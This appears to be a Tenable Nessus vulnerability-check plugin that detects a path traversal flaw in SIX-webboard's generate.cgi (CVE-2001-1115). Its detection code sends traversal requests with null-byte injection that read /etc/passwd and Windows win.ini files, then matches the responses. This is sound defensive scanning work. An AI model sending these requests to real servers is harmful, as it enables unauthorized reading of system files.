#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(10725);
 script_version ("$Revision: 1.29 $");

 script_cve_id("CVE-2001-1115");
 script_bugtraq_id(3175);
 script_osvdb_id(603);
 
 script_name(english:"SIX-webboard generate.cgi 'content' Parameter Traversal Arbitrary File Access");
 script_summary(english:"Checks for the presence of generate.cgi.");
 
 script_set_attribute(attribute:"synopsis",value:
"The remote web server contains a CGI script that allows access to
arbitrary files." );
 script_set_attribute(attribute:"description", value:
"The version of the 'generate.cgi' from SIX-webboard installed on the
remote web server allows an unauthenticated, remote attacker to access
arbitrary files with the privileges of the http daemon due to improper
validation of user-supplied input to the 'content' variable of
directory traversal sequences.");
 script_set_attribute(
  attribute:"see_also", 
  value:"http://seclists.org/bugtraq/2001/Aug/181"
 );
 script_set_attribute(
  attribute:"solution", 
  value:"Unknown at this time."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2001/08/13");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/08/13");

 script_cvs_date("$Date: 2016/11/17 15:28:26 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2001-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);


flag = 0;

foreach dir (cgi_dirs())
{
 cgi = string(dir, "/webboard/generate.cgi");
 if (is_cgi_installed3(item:cgi, port:port))flag = 1;
 else
 {
 cgi = string(dir, "/generate.cgi");
 if(is_cgi_installed3(item:cgi, port:port)){
 	flag = 1;
	}
 }
 if (flag) break;
}

if(!flag)exit(0);


 # may need to be improved...
 w = http_send_recv3(method: "GET", item:string(dir, "/", cgi,
"?content=../../../../../../etc/passwd%00board=board_1"),
		port:port);
if (isnull(w)) exit(1, "The web server did not answer");
r = strcat(w[0], w[1], '\r\n', w[2]);

  if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
  {
   security_warning(port);
   exit(0);
  }

w = http_send_recv3(method:"GET", item:string(dir, "/", cgi,
"?content=../../../../../../windows/win.ini%00board=board_1"),
		port:port);
if (isnull(w)) exit(1, "The web server did not answer");
r = strcat(w[0], w[1], '\r\n', w[2]);

  if("[windows]" >< r)
  {
   security_warning(port);
   exit(0);
  }

w = http_send_recv3(method:"GET", item:string(dir, "/", cgi,
"?content=../../../../../../winnt/win.ini%00board=board_1"),
		port:port);
if (isnull(w)) exit(1, "The web server did not answer.");
r = strcat(w[0], w[1], '\r\n', w[2]);

  if("[fonts]" >< r)
  {
   security_warning(port);
   exit(0);
  }
